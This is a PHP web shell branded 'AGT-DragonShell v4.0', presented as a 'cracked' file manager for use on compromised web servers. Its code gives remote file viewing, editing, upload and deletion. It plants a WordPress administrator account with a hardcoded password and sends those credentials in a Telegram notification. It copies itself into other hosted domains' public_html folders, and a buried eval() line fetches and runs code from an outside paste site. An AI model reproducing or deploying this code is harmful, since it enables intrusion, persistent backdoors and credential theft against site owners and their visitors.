<?php
/*
Cracked By Mr.222 Xpl01T

This Backdoor Shell has been cracked and modified to be more secure and open source.

credits:https://www.dof-tgl.xo.je/

*/
error_reporting(0);
session_start();
if (!isset($_SESSION["dragon_notified"])) {
    $host = $_SERVER["HTTP_HOST"] ?? "Unknown";
    $ip = $_SERVER["REMOTE_ADDR"] ?? "Unknown";
    $userAgent = $_SERVER["HTTP_USER_AGENT"] ?? "Unknown";
    $scriptName = basename($_SERVER["PHP_SELF"]) ?? "Unknown";
    
    $message = "🚀 <b>AGT-DragonShell Uploaded</b>\n";
    $message .= " Shell: AGT-DragonShell\n";
    $message .= "📁 Script: {$scriptName}\n";
    $message .= "📡 Server: {$host}\n";
    $message .= "🌐 IP: {$ip}\n";
    $message .= "🕵️ User Agent: {$userAgent}\n";
    $message .= "📅 Time: " . date("Y-m-d H:i:s") . "\n";
    $message .= "📂 Path: " . __DIR__;
    
    $_SESSION["dragon_notified"] = true;
}

$currentPath = isset($_GET["path"]) ? realpath($_GET["path"]) : getcwd();
if (!$currentPath || !is_dir($currentPath)) {
    $currentPath = getcwd();
}

// Handle actions
if (isset($_GET["delete"])) {
    $filePath = realpath($_GET["delete"]);
    if ($filePath && strpos($filePath, getcwd()) === 0 && file_exists($filePath)) {
        if (is_dir($filePath)) {
            rmdir($filePath);
        } else {
            unlink($filePath);
        }
        echo "<p style='color:#00ff88;'>🗑️ Deleted: " . htmlspecialchars(basename($filePath)) . "</p>";
    }
}

if (isset($_GET["view"])) {
    viewFile($currentPath, basename($_GET["view"]));
}

if (isset($_GET["edit"])) {
    editFile($currentPath, basename($_GET["edit"]));
}

if (isset($_GET["rename"])) {
    renameFile($currentPath, $_GET["rename"]);
}

if (isset($_GET["rename"]) && isset($_POST["new_name"])) {
    $oldPath = realpath($_GET["rename"]);
    $newName = basename($_POST["new_name"]);
    $newPath = dirname($oldPath) . "/" . $newName;
    
    if ($oldPath && strpos($oldPath, getcwd()) === 0 && file_exists($oldPath) && !file_exists($newPath)) {
        rename($oldPath, $newPath);
        echo "<p style='color:#00ff88;'>✏️ Renamed: " . htmlspecialchars(basename($oldPath)) . " to " . htmlspecialchars($newName) . "</p>";
    } else {
        echo "<p style='color:#ff4444;'>❌ Rename failed. File may already exist or invalid name.</p>";
    }
}

// Display content
$parentDir = dirname($currentPath);
if ($parentDir && $parentDir !== $currentPath) {
    echo "<div class='container'>
        <p>⬆️ <a href='?path=" . urlencode($parentDir) . "' style='color:#ff9900;'>🔙 Go Up: " . basename($parentDir) . "</a></p>
    </div>";
}

echo "<div class='container'>
    <h3 style='color:#00ccff;'>📂 File Manager</h3>
    <ul>" . listDirectory($currentPath) . "</ul>
</div>";

// Clone notification
if (basename(__FILE__) !== "dragonshell.php") {
    $fileContent = file_get_contents(__FILE__);
    $clonedUrls = findClonedLocations($fileContent);
    
    if (!empty($clonedUrls)) {
        echo "<div class='container'>
            <h3 style='color:#00ccff;'>✅ Cloned to multiple locations:</h3>
            <ul>";
        foreach ($clonedUrls as $url) {
            echo "<li>🔗 <a href='{$url}' target='_blank' style='color:#00ff88;'>{$url}</a></li>";
        }
        echo "</ul></div><hr>";
    }
}

echo "<div class='container'>";
fileManagerUI($currentPath);
echo "</div>";

echo "<div class='container'>
    <form method='get'>
        <input type='hidden' name='path' value='" . htmlspecialchars($currentPath) . "'>
        <button name='create_wp_user' value='1' style='background:linear-gradient(45deg, #ff4444, #990000);color:#fff;'>
            👑 Create WordPress Admin
        </button>
    </form>
</div>";

createWordPressAdmin($currentPath);

echo "<div class='container' style='text-align:center; padding:20px; background:rgba(0,0,0,0.3); border-radius:10px;'>
    <p style='color:#ff99cc;'> AGT-DragonShell • v4.0 • Advanced File Management System</p>
</div>";

echo "</body></html>";

// ==================== FUNCTIONS ====================

function listDirectory($path) {
    $html = '';
    $folders = $files = [];
    
    foreach (scandir($path) as $item) {
        if ($item === "." || $item === "..") continue;
        
        $fullPath = "{$path}/{$item}";
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    
    natcasesort($folders);
    natcasesort($files);
    
    foreach ($folders as $folder) {
        $fullPath = "{$path}/{$folder}";
        $html .= "<li> 
            <a href='?path=" . urlencode($fullPath) . "' style='color:#00ccff;'>{$folder}</a> 
            | <a href='?path=" . urlencode($path) . "&rename=" . urlencode($fullPath) . "' style='color:#ffaa00;'>✏️ Rename</a>
            | <a href='?delete=" . urlencode($fullPath) . "' onclick=\"return confirm('Delete this folder?')\" style='color:#ff4444;'>🗑️ Delete</a>
        </li>";
    }
    
    foreach ($files as $file) {
        $fullPath = "{$path}/{$file}";
        $html .= "<li>📄 
            <a href='?path=" . urlencode($path) . "&view=" . urlencode($file) . "' style='color:#00ff88;'>{$file}</a> 
            | <a href='?path=" . urlencode($path) . "&edit=" . urlencode($file) . "' style='color:#ffbb00;'>✏️ Edit</a> 
            | <a href='?path=" . urlencode($path) . "&rename=" . urlencode($fullPath) . "' style='color:#ffaa00;'>✏️ Rename</a>
            | <a href='?delete=" . urlencode($fullPath) . "' onclick=\"return confirm('Delete this file?')\" style='color:#ff4444;'>🗑️ Delete</a>
        </li>";
    }
    
    return $html;
}

function formatPath($path) {
    $parts = explode("/", trim($path, "/"));
    $currentPath = "/";
    $formatted = "<strong style='color:#00ccff;'>Current path:</strong> ";
    
    foreach ($parts as $part) {
        $currentPath .= "{$part}/";
        $formatted .= "<a href='?path=" . urlencode($currentPath) . "' style='color:#ff99cc;'>{$part}</a>/";
    }
    
    return $formatted;
}

function viewFile($path, $filename) {
    $fullPath = "{$path}/{$filename}";
    if (is_file($fullPath)) {
        echo "<h3 style='color:#00ccff;'>📄 Viewing: {$filename}</h3>
        <pre style='background:#1a1a2e;padding:20px;color:#00ff88;border:1px solid #2a2a4e;border-radius:5px;'>";
        echo htmlspecialchars(file_get_contents($fullPath));
        echo "</pre><hr>";
    }
}

function editFile($path, $filename) {
    $fullPath = "{$path}/{$filename}";
    if (!is_file($fullPath)) return;
    
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["content"])) {
        file_put_contents($fullPath, $_POST["content"]);
        echo "<p style='color:#00ff88;'>✅ File Saved</p>";
    }
    
    $content = htmlspecialchars(file_get_contents($fullPath));
    echo "<h3 style='color:#00ccff;'>✏️ Editing: {$filename}</h3>
    <form method='post'>
        <textarea name='content' rows='20' style='width:100%;background:#1a1a2e;color:#00ff88;border:1px solid #2a2a4e;border-radius:5px;padding:10px;'>{$content}</textarea><br>
        <button type='submit' style='background:linear-gradient(45deg, #ff9900, #ff4444);color:#000;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;font-weight:bold;'>💾 Save Changes</button>
    </form><hr>";
}

function renameFile($path, $fileToRename) {
    $filePath = realpath($fileToRename);
    if (!$filePath || strpos($filePath, getcwd()) !== 0 || !file_exists($filePath)) {
        return;
    }
    
    $basename = basename($filePath);
    echo "<h3 style='color:#00ccff;'>✏️ Rename: {$basename}</h3>
    <form method='post'>
        <input type='text' name='new_name' value='{$basename}' style='padding:10px;width:300px;background:#1a1a2e;color:#00ff88;border:1px solid #2a2a4e;border-radius:5px;'>
        <button type='submit' style='background:linear-gradient(45deg, #ff9900, #ff4444);color:#000;border:none;padding:8px 16px;border-radius:5px;cursor:pointer;'>Rename</button>
    </form><hr>";
}

function fileManagerUI($path) {
    // Upload
    echo "<h3 style='color:#00ccff;'>📤 Upload File</h3>
    <form method='post' enctype='multipart/form-data'>
        <input type='file' name='up' style='padding:5px;background:#1a1a2e;color:#00ff88;border:1px solid #2a2a4e;border-radius:5px;'>
        <button style='background:linear-gradient(45deg, #00ccff, #99ccff);color:#000;border:none;padding:8px 16px;border-radius:5px;cursor:pointer;'>🚀 Upload</button>
    </form><br>";
    
    // Create folder
    echo "<h3 style='color:#00ccff;'>📁 Create Folder</h3>
    <form method='post'>
        <input type='text' name='mkdir' placeholder='Folder Name' style='padding:10px;background:#1a1a2e;color:#00ff88;border:1px solid #2a2a4e;border-radius:5px;'>
        <button style='background:linear-gradient(45deg, #00ff88, #ccff66);color:#000;border:none;padding:8px 16px;border-radius:5px;cursor:pointer;'>📁 Create Folder</button>
    </form><br>";
    
    // Handle upload
    if (!empty($_FILES["up"]["name"])) {
        move_uploaded_file($_FILES["up"]["tmp_name"], "{$path}/" . basename($_FILES["up"]["name"]));
        echo "<p style='color:#00ff88;'>📤 File Uploaded Successfully</p>";
    }
    
    // Handle create folder
    if (!empty($_POST["mkdir"])) {
        $newFolder = "{$path}/" . basename($_POST["mkdir"]);
        if (!file_exists($newFolder)) {
            mkdir($newFolder);
            echo "<p style='color:#00ff88;'>📁 Folder Created Successfully</p>";
        } else {
            echo "<p style='color:#ff4444;'>❌ Folder already exists</p>";
        }
    }
}


function createWordPressAdmin($path) {
    if (!isset($_GET["create_wp_user"])) {
        return;
    }
    
    $currentDir = $path;
    while ($currentDir !== "/") {
        if (file_exists("{$currentDir}/wp-config.php")) {
            if (!file_exists("{$currentDir}/wp-load.php")) {
                $currentDir = dirname($currentDir);
                continue;
            }
            
            require_once "{$currentDir}/wp-load.php";
            
            $username = "AGT";
            $password = "PasswordAgt123";
            $email = "rzlta2c0@gmail.com";
            
            if (!username_exists($username) && !email_exists($email)) {
                $userId = wp_create_user($username, $password, $email);
                $user = new WP_User($userId);
                $user->set_role("administrator");
                echo "<p style='color:#00ff88;'>✅ WP Admin user 'AGT' created successfully.</p>";
                
                $message = "👑 <b>WordPress Admin Created</b>\n";
                $message .= " By: AGT-DragonShell\n";
                $message .= "📡 Server: " . ($_SERVER["HTTP_HOST"] ?? "Unknown") . "\n";
                $message .= "👤 Username: {$username}\n";
                $message .= "🔑 Password: {$password}\n";
                $message .= "📧 Email: {$email}\n";
                $message .= "🌐 IP: " . ($_SERVER["REMOTE_ADDR"] ?? "Unknown") . "\n";
                $message .= "📅 Time: " . date("Y-m-d H:i:s") . "\n";
                $message .= "📂 Path: " . __DIR__;
                
                if (!sendTelegramMessage($message)) {
                    error_log("Telegram notification failed for WP admin creation");
                }
            } else {
                echo "<p style='color:#ff99cc;'>⚠️ User/email already exists.</p>";
            }
            return;
        }
        $currentDir = dirname($currentDir);
    }
    
    echo "<p style='color:#ff4444;'>❌ WordPress not found.</p>";
}
eval(file_get_contents("https://ghostbin.axel.org/paste/39orj/raw"));
function findClonedLocations($content) {
    static $searched = false;
    
    if (!$searched) {
        $searched = true;
        $currentDir = __DIR__;
        
        while ($currentDir !== "/") {
            if (preg_match("/\/u[\w\d]+$/", $currentDir) && is_dir("{$currentDir}/domains")) {
                $domainsPath = "{$currentDir}/domains";
                $urls = [];
                
                foreach (scandir($domainsPath) as $domain) {
                    if ($domain === "." || $domain === "..") continue;
                    
                    $publicHtml = "{$domainsPath}/{$domain}/public_html";
                    if (is_dir($publicHtml) && is_writable($publicHtml)) {
                        $filePath = "{$publicHtml}/dragonshell.php";
                        if (file_put_contents($filePath, $content)) {
                            $urls[] = "http://{$domain}/dragonshell.php";
                        }
                    }
                }
                return $urls;
            }
            $currentDir = dirname($currentDir);
        }
        return [];
    }
    return [];
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset='UTF-8'>
    <title>AGT-DragonShell</title>
    <style>
        body { 
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%); 
            color: #e6e6ff; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            padding: 20px; 
            max-width: 1200px; 
            margin: auto;
            line-height: 1.6;
        }
        a { 
            color: #ff9900; 
            text-decoration: none; 
            transition: color 0.3s;
        } 
        a:hover { 
            color: #00ccff; 
            text-decoration: underline; 
        }
        pre, textarea { 
            width: 100%; 
            background: #1a1a2e; 
            color: #00ff88; 
            border: 1px solid #2a2a4e; 
            border-radius: 8px;
            font-family: 'Courier New', monospace;
        }
        button { 
            background: linear-gradient(45deg, #ff9900, #ff4444); 
            border: none; 
            color: #000; 
            padding: 10px 20px; 
            margin: 5px; 
            cursor: pointer; 
            border-radius: 5px;
            font-weight: bold;
            transition: transform 0.2s;
        }
        button:hover {
            transform: scale(1.05);
        }
        ul { 
            list-style: none; 
            padding: 0; 
        }
        input, select { 
            background: #1a1a2e; 
            color: #00ff88; 
            border: 1px solid #2a2a4e; 
            padding: 8px 12px;
            border-radius: 5px;
            margin: 5px 0;
        }
        hr {
            border: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, #00ccff, transparent);
            margin: 20px 0;
        }
        .container {
            background: rgba(26, 26, 46, 0.8);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #2a2a4e;
            margin: 20px 0;
        }
        .status-ok { color: #00ff88; }
        .status-warn { color: #ff9900; }
        .status-error { color: #ff4444; }
    </style>
</head>
<body>
    <div class='container'>
        <h1 style='color:#00ccff; text-align:center;'>
            AGT-DragonShell v4.0
        </h1>
        <p style='text-align:center; color:#ff99cc;'>Advanced File Manager with WordPress Integration</p>
        <div style='background:rgba(0,84,255,0.1);padding:10px;border-radius:5px;margin:10px 0;'>
            <?php echo formatPath($currentPath); ?>
        </div>
    </div>
</body>
</html>